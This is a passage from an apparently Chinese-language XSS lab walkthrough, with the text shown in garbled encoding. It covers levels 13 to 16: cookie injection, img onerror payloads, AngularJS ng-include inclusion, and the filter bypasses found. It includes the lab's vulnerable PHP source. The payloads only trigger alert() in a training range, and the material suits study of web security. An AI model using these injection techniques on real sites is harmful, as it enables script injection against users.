<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_49.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<ul>
<li>åŒå¼•å·è¢«å®ä¾‹åŒ–è½¬ä¹‰</li>
</ul>
<p>å…¶ä½™æµ‹è¯•payloadä¹Ÿå¤±è´¥</p>
<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="*Cookie"></a>*Cookie</h3><p>æŠ“å–æ•°æ®åŒ…ä¿®æ”¹cookieæ ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot; onclick=alert(&#x27;123&#x27;) type=&#x27;text&#x27; //</span><br></pre></td></tr></table></figure>

<p>ç‚¹å‡»æ–‡æœ¬æ¡†æˆåŠŸé€šå…³</p>
<p>æºç åˆ†æï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level14.php&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level13&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level13&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];  <span class="comment">//è·å–cookie</span></span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level14a"><a href="#level14a" class="headerlink" title="level14a"></a>level14a</h2><p>ç±»å‹ï¼š</p>
<p>è§£é¢˜æ€è·¯;</p>
<h3 id="PHPè§£ææ‰§è¡Œæœºåˆ¶"><a href="#PHPè§£ææ‰§è¡Œæœºåˆ¶" class="headerlink" title="*PHPè§£ææ‰§è¡Œæœºåˆ¶"></a>*PHPè§£ææ‰§è¡Œæœºåˆ¶</h3><blockquote>
<p>PHP è§£ææœºåˆ¶ï¼šPHP æ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯æœåŠ¡å™¨ç«¯è„šæœ¬æ–‡ä»¶ï¼Œå½“æœåŠ¡å™¨æ¥æ”¶åˆ°å¯¹ PHP æ–‡ä»¶çš„è¯·æ±‚æ—¶ï¼Œä¼šå…ˆå¯¹å…¶ä¸­çš„ PHP ä»£ç è¿›è¡Œè§£æå’Œæ‰§è¡Œã€‚ å¦‚æœæ–‡ä»¶é‡Œæœ‰ HTMLã€CSSã€JavaScript ä»£ç ï¼ŒPHP è§£æå™¨ä¼šç›´æ¥å°†è¿™äº›é PHP ä»£ç åŸæ ·è¾“å‡ºç»™å®¢æˆ·ç«¯ã€‚</p>
</blockquote>
<p>è¾“å…¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);&lt;/scritp&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_50.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>script åˆ«td åŒ…å«ï¼Œæ— æ³•æ‰§è¡Œjsä»£ç </p>
<p>è¾“å…¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;123&#x27;)&quot;</span>&gt;</span>      //é¡µé¢åŠ è½½è§¦å‘</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;123&#x27;)&quot;</span>&gt;</span>  //æ•°æ ‡æ‚¬åœè§¦å‘</span><br></pre></td></tr></table></figure>
<p>æ¸²æŸ“ï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_51.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">


<p>é€šå…³æˆåŠŸ</p>
<p>æºç åˆ†æï¼š</p>
<hr>
<h2 id="level14b"><a href="#level14b" class="headerlink" title="level14b"></a>level14b</h2><p>ç±»å‹ï¼šæ–‡ä»¶ä¸Šä¼ </p>
<p>è§£é¢˜æ€è·¯ï¼š</p>
<h3 id="EXIF"><a href="#EXIF" class="headerlink" title="*EXIF"></a>*EXIF</h3><blockquote>
<p>å›¾ç‰‡çš„ EXIFï¼ˆExchangeable Image File Formatï¼‰ æ˜¯åµŒå…¥åœ¨å›¾ç‰‡æ–‡ä»¶ä¸­çš„ä¸€ç»„å…ƒæ•°æ®ï¼ˆMetadataï¼‰ï¼Œè®°å½•äº†æ‹æ‘„è®¾å¤‡ã€æ‹æ‘„å‚æ•°ã€æ—¶é—´ã€åœ°ç†ä½ç½®ç­‰ä¿¡æ¯ã€‚å®ƒæ˜¯æ•°ç ç…§ç‰‡çš„â€œæ•°å­—èº«ä»½è¯â€ï¼Œå¹¿æ³›åº”ç”¨äºæ‘„å½±ã€å–è¯å’Œå›¾ç‰‡ç®¡ç†<br>EXIF åŒ…å«çš„ä¿¡æ¯ï¼š</p>
<blockquote>
<p>1.åŸºç¡€ä¿¡æ¯:</p>
<blockquote>
<p>æ‹æ‘„æ—¶é—´ã€æ—¥æœŸ<br>æ–‡ä»¶æ ¼å¼ï¼ˆå¦‚ JPEGã€RAWï¼‰<br>æ–‡ä»¶å¤§å°å’Œåˆ†è¾¨ç‡</p>
<blockquote>
<p>2.è®¾å¤‡å‚æ•°</p>
<blockquote>
<p>ç›¸æœºå“ç‰Œå’Œå‹å·ï¼ˆå¦‚ Canon EOS 5D Mark IVï¼‰<br>é•œå¤´å‹å·<br>åºåˆ—å·ï¼ˆéƒ¨åˆ†è®¾å¤‡ï¼‰</p>
<blockquote>
<p>3.æ‹æ‘„å‚æ•°</p>
<blockquote>
<p>å…‰åœˆå€¼ï¼ˆFå€¼ï¼‰<br>å¿«é—¨é€Ÿåº¦<br>ISO æ„Ÿå…‰åº¦<br>ç„¦è·ï¼ˆå¦‚ 50mmï¼‰<br>ç™½å¹³è¡¡æ¨¡å¼<br>æ›å…‰è¡¥å¿</p>
<blockquote>
<p>4.åœ°ç†ä½ç½®</p>
<blockquote>
<p>GPS åæ ‡ï¼ˆéœ€è®¾å¤‡å¼€å¯å®šä½åŠŸèƒ½ï¼‰<br>æµ·æ‹”é«˜åº¦ï¼ˆéƒ¨åˆ†è®¾å¤‡æ”¯æŒï¼‰</p>
<blockquote>
<p>4.å…¶ä»–ä¿¡æ¯</p>
<blockquote>
<p>ç‰ˆæƒå£°æ˜ï¼ˆä½œè€…ä¿¡æ¯ï¼‰<br>ç¼©ç•¥å›¾é¢„è§ˆ<br>åæœŸç¼–è¾‘è½¯ä»¶ï¼ˆå¦‚ Photoshop ä¿®æ”¹è®°å½•ï¼‰</p>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
<blockquote>
<p>EXIF çš„ä½œç”¨ä¸ç”¨é€”<br>1.æ‘„å½±å­¦ä¹ <br>2.åˆ†æä»–äººä½œå“çš„æ‹æ‘„å‚æ•°ï¼ˆå¦‚å…‰åœˆã€å¿«é—¨ï¼‰ï¼Œæå‡æ‘„å½±æŠ€å·§ã€‚<br>3.å›¾ç‰‡ç®¡ç†<br>4.æŒ‰æ—¶é—´ã€è®¾å¤‡åˆ†ç±»æ•´ç†ç…§ç‰‡ã€‚<br>5.ç‰ˆæƒä¿æŠ¤<br>6.é€šè¿‡ EXIF ä¸­çš„ä½œè€…ä¿¡æ¯è¯æ˜å›¾ç‰‡å½’å±ã€‚<br>åœ°ç†ä½ç½®è®°å½•<br>7.æ—…è¡Œæ‘„å½±æ—¶æ ‡è®°æ‹æ‘„åœ°ç‚¹ã€‚<br>8.å–è¯è°ƒæŸ¥<br>9.éªŒè¯å›¾ç‰‡çœŸå®æ€§ï¼ˆå¦‚æ—¶é—´ã€è®¾å¤‡æ˜¯å¦åŒ¹é…ï¼‰ã€‚</p>
</blockquote>
<blockquote>
<p>é—®é¢˜ä¸è§£å†³ï¼š<br>1.æ•æ„Ÿä¿¡æ¯æ³„éœ²<br>GPS åæ ‡å¯èƒ½æš´éœ²å®¶åº­ä½å€æˆ–å¸¸å»åœ°ç‚¹ã€‚<br>2.æ¸…é™¤ EXIF</p>
<blockquote>
<p>åˆ†äº«å›¾ç‰‡å‰ï¼Œä½¿ç”¨å·¥å…·åˆ é™¤ EXIFï¼ˆå¦‚ Exif Purgeï¼‰ã€‚</p>
</blockquote>
<p>3.å¹³å°è‡ªåŠ¨åˆ é™¤</p>
<blockquote>
<p>å¾®ä¿¡ã€å¾®åšç­‰ç¤¾äº¤å¹³å°ä¸Šä¼ å›¾ç‰‡æ—¶ä¼šé»˜è®¤æ¸…é™¤ EXIFã€‚</p>
</blockquote>
</blockquote>
<p>éšä¾¿ä¸Šä¼ æ­£å¸¸çš„ç…§ç‰‡ï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_52.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>å±•ç¤ºäº†å¾ˆå¤šé¡¹ä¿¡æ¯ï¼Œéšä¾¿ä¿®æ”¹å›¾ç‰‡çš„æŸä¸€é¡¹ä¸ºxssæ”»å‡»ä»£ç å³å¯é€šå…³</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_53.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>æœ‰è‡ªåŠ¨å¼¹çª—</p>
<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>è§£é¢˜æ€è·¯ï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_54.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<blockquote>
<p>é¡µé¢æŠ€æœ¯ç‰¹å¾<br>1.AngularJS æ¡†æ¶ï¼šä»£ç å¼•å…¥äº† angular.min.jsï¼Œè¯´æ˜é¡µé¢ä¾èµ– AngularJS åŠ¨æ€æ¸²æŸ“å†…å®¹ã€‚<br>2.æœªå®ç°çš„ ngIncludeï¼šæ³¨é‡Š <!-- ngInclude: undefined --> è¡¨æ˜å­˜åœ¨ä¸€ä¸ªæœªå®Œæˆçš„åŠ¨æ€å†…å®¹åŠ è½½é€»è¾‘ï¼Œå¯èƒ½éœ€é€šè¿‡ç‰¹å®šæ“ä½œè§¦å‘</p>
</blockquote>
<h3 id="AngularJSä¸æŒ‡ä»¤ng-inlcude"><a href="#AngularJSä¸æŒ‡ä»¤ng-inlcude" class="headerlink" title="*AngularJSä¸æŒ‡ä»¤ng-inlcude"></a>*AngularJSä¸æŒ‡ä»¤ng-inlcude</h3><blockquote>
<ol>
<li>ng - includeæŒ‡ä»¤ç‰¹æ€§<blockquote>
<p>ng - includeæ˜¯ Angular JS æ¡†æ¶ä¸­çš„æŒ‡ä»¤ï¼Œç”¨äºåœ¨ HTML é¡µé¢ä¸­åŠ¨æ€åŒ…å«å¤–éƒ¨æ–‡ä»¶æˆ–ç‰‡æ®µï¼Œé€šè¿‡æµè§ˆå™¨çš„ XHR è¯·æ±‚åŠ è½½å¤–éƒ¨æ–‡ä»¶ï¼ˆéœ€ç¡®ä¿æ–‡ä»¶åœ¨åŒä¸€åŸŸåä¸‹å¯è®¿é—®ï¼‰ã€‚å®ƒä¸æœåŠ¡å™¨ç«¯çš„æ–‡ä»¶åŒ…å«ï¼ˆå¦‚ PHPï¼‰ä¸åŒï¼Œæ˜¯åœ¨æµè§ˆå™¨ç«¯è¯·æ±‚å¹¶åŠ è½½æ–‡ä»¶å†…å®¹ï¼Œç„¶åå°†å…¶æ’å…¥åˆ°å½“å‰é¡µé¢æŒ‡å®šä½ç½®ã€‚</p>
</blockquote>
</li>
</ol>
</blockquote>
<p>æ”»å‡»åŸç†ï¼š</p>
<blockquote>
<p>é»˜è®¤æƒ…å†µä¸‹çš„ï¼Œng-include åªèƒ½åŠ è½½å½“å‰é¡µé¢åŒæºçš„ï¼ˆç›¸åŒåŸŸåï¼Œåè®®ï¼Œç«¯å£ï¼‰çš„æ–‡ä»¶<br>ng - includeåŠ è½½level1.phpæ—¶ï¼Œå°†name&#x3D;[script]alert(&#x2F;xss&#x2F;)[&#x2F;script]ä½œä¸ºå‚æ•°ä¼ é€’ç»™level1.phpã€‚<br>ç”±äºlevel1.phpæœªå¯¹nameå‚æ•°åšä¸¥æ ¼è¿‡æ»¤ï¼Œæµè§ˆå™¨è§£ælevel1.phpè¿”å›çš„ HTML æ—¶ï¼Œä¼šæ‰§è¡Œæ¶æ„è„šæœ¬alert(&#x2F;xss&#x2F;)ï¼Œä»è€Œè§¦å‘ XSS æ”»å‡»ã€‚</p>
</blockquote>
<p>å…³å¡ï¼š</p>
<blockquote>
<p>æœ¬å…³æ¼æ´åˆ©ç”¨åˆ†æ<br>1.å½“å‰å…³å¡è¿‡æ»¤ï¼š</p>
<blockquote>
<p>ä¼ å…¥çš„srcå‚æ•°ä¼šè¢«htmlspecialchars()å‡½æ•°è¿‡æ»¤ï¼Œç›´æ¥æ³¨å…¥scriptç­‰æ•æ„Ÿæ ‡ç­¾ä¼šè¢«è½¬ä¹‰ï¼Œæ— æ³•ç›´æ¥è§¦å‘ XSSã€‚</p>
</blockquote>
<p>2.ç»“åˆå…¶ä»–é¡µé¢æ¼æ´ï¼š</p>
<blockquote>
<p>é¶åœºä¸­å…¶ä»–é¡µé¢ï¼ˆå¦‚level1.phpï¼‰å­˜åœ¨ XSS æ¼æ´ï¼ˆå‡è®¾nameå‚æ•°è¾“å…¥æœªè¿‡æ»¤ï¼‰</p>
</blockquote>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">åˆ©ç”¨ng - includeçš„æ–‡ä»¶åŒ…å«ç‰¹æ€§ï¼Œæ„é€  Payloadï¼š</span><br><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;        	//ä¸è¡Œ</span><br><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(&quot;123&quot;)&#x27;</span>&gt;</span>&#x27;	   //ä¸è¡Œ</span><br><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">123</span>&#x27;)&gt;</span>&#x27;  	  //ä¸è¡Œ</span><br><span class="line">src=&quot;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">123</span>&quot;)&gt;</span>&quot;       //ä¸è¡Œ</span><br><span class="line"></span><br><span class="line">src=&quot;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">123</span>&#x27;)&gt;</span>&quot;    //è¡Œ</span><br><span class="line">src=&quot;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">123</span>&#x27;)&gt;</span>&quot;     //è¡Œ</span><br><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">123</span>&quot;)&gt;</span>&#x27;    //è¡Œ</span><br><span class="line"></span><br><span class="line"> - ç”¨imgæ ‡ç­¾è¡Œ</span><br><span class="line"> - onerrorå¤–ä¸å¥—å•åŒå¼•å·ï¼Œè®©æµè§ˆå™¨å®¹é”™ï¼Œé˜²æ­¢è¿‡å¤šçš„å•åŒå¼•å·è®©æµè§ˆå™¨è¯†åˆ«é”™è¯¯</span><br><span class="line"></span><br><span class="line">ä¸ºä»€ä¹ˆæœ‰äº›è¯­å¥ä¸ºä»€ä¹ˆä¸è¡Œå‘¢ï¼Ÿ</span><br><span class="line">å› ä¸ºè¯­å¥è¦è€ƒè™‘çš„ä¸ä»…ä»…æ˜¯æœ¬å…³çš„è¿‡æ»¤ï¼Œä¹Ÿè¦è€ƒè™‘å¼•ç”¨å¯¹åº”å…³å¡çš„è¿‡æ»¤</span><br></pre></td></tr></table></figure>

<p>å…³é”®æµç¨‹æ€»ç»“</p>
<blockquote>
<p>ng - includeé€šè¿‡æµè§ˆå™¨è¯·æ±‚åŠ è½½level1.phpï¼Œä¼ é€’å¸¦æœ‰æ¶æ„è„šæœ¬çš„å‚æ•°ã€‚<br>å­˜åœ¨æ¼æ´çš„level1.phpæ¥æ”¶å‚æ•°åï¼Œæœªè¿‡æ»¤ç›´æ¥å›æ˜¾æ¶æ„è„šæœ¬åˆ°é¡µé¢ã€‚<br>æµè§ˆå™¨è§£ææ‰§è¡Œæ¶æ„è„šæœ¬ï¼Œå®Œæˆ XSS æ”»å‡»ã€‚</p>
</blockquote>
<p>è¿™ç§åˆ©ç”¨æ–¹å¼ç»•è¿‡äº†å½“å‰å…³å¡çš„è¿‡æ»¤ï¼Œå€ŸåŠ©ng - includeçš„ç‰¹æ€§å’Œå…¶ä»–é¡µé¢çš„ XSS æ¼æ´ï¼Œå®ç°äº†è·¨é¡µé¢çš„è„šæœ¬æ”»å‡»ã€‚</p>
<p>æºç åˆ†æï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;angular.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level16.php?keyword=test&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°ç¬¬<span class="number">15</span>å…³ï¼Œè‡ªå·±æƒ³ä¸ªåŠæ³•èµ°å‡ºå»å§ï¼&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];   <span class="comment">//è·å–srcçš„å€¼</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;  <span class="comment">//å®ä¾‹åŒ–è½¬ä¹‰--&gt;å› æ­¤æœ¬å…³çš„</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>è§£é¢˜æ€è·¯ï¼š</p>
<p>ç±»å‹ï¼šè¾“å…¥æ¡†ç±»å‹</p>
<p>è¾“å…¥æµ‹è¯•è¯­å¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç½‘é¡µå›æ˜¾æƒ…å†µï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_55.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>æŸ¥çœ‹å®ä¾‹åŒ–æƒ…å†µï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_56.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<p>æ­¤æ—¶çš„é¡µé¢æ¸²æŸ“:</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_57.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">


<p>è¡¥å……çŸ¥è¯†ï¼šcenteræ ‡ç­¾</p>
<blockquote>
<p>[center]æ ‡ç­¾çš„ä½œç”¨ï¼šå°†åŒ…è£¹çš„æ–‡æœ¬ã€å›¾ç‰‡æˆ–å…¶ä»–å…ƒç´ åœ¨çˆ¶å®¹å™¨ä¸­æ°´å¹³å±…ä¸­æ˜¾ç¤ºã€‚<br>HTML4 åŠæ›´æ—©ç‰ˆæœ¬æ”¯æŒ centerï¼Œä½† HTML5 å·²å°†å…¶åºŸå¼ƒã€‚<br>è¢«å¼ƒç”¨çš„åŸå› ï¼š<br>1.HTML åº”ä¸“æ³¨äºç»“æ„ï¼ˆå¦‚æ ‡é¢˜ã€æ®µè½ï¼‰ï¼Œæ ·å¼åº”äº¤ç»™ CSS æ§åˆ¶ã€‚<br>2.ç»´æŠ¤æ€§å’Œçµæ´»æ€§å·®ï¼šæ··åˆæ ·å¼ä¸ç»“æ„ï¼Œå¯¼è‡´ä»£ç éš¾ä»¥ç»´æŠ¤ã€‚<br>3.æ— æ³•é€‚åº”å¤æ‚å¸ƒå±€ï¼ˆå¦‚å“åº”å¼è®¾è®¡ï¼‰ã€‚<br>é‡ç‚¹ï¼šcenter æ ‡ç­¾å†…åµŒå¥— script æ ‡ç­¾ï¼Œå…¶ä¸­çš„ JavaScript ä»£ç ä»ä¼šè¢«æµè§ˆå™¨æ‰§è¡Œ</p>
</blockquote>
<p>è§£è¯»å›æ˜¾ä¿¡æ¯ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&amp;lt;</span> -&gt;   &lt;</span><br><span class="line"><span class="symbol">&amp;gt;</span> -&gt;   &gt;</span><br><span class="line"><span class="symbol">&amp;nbsp;</span> -&gt; ç©ºæ ¼</span><br><span class="line"><span class="symbol">&amp;amp;</span> -&gt; &amp;</span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;lt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;gt;</span>alert(&quot;123&quot;);<span class="symbol">&amp;lt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;gt;</span> å³ä¸ºï¼š</span><br><span class="line">&lt; &gt;alert(&quot;123&quot;);&lt;  &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>æ‹¬å·å†…çš„åŒå¼•å·æ²¡æœ‰å®ä¾‹åŒ–è½¬ä¹‰æˆ–è¢«æ›¿æ¢</li>
<li>ç‰¹æ®Šç¬¦å· &lt; &gt;  ç©ºæ ¼  &amp; å·è¢«å®ä¾‹åŒ–è½¬ä¹‰</li>
<li>scriptæ ‡ç­¾ç¼ºå¤±ï¼Œå‡†ç¡®æ¥è¯´è¢«æ›¿æ¢ä¸ºç©ºæ ¼</li>
</ul>
<p>æ¢æ ‡ç­¾ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">123</span>&quot;)&gt;</span> </span><br></pre></td></tr></table></figure>
<p>å›æ˜¾ï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_58.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
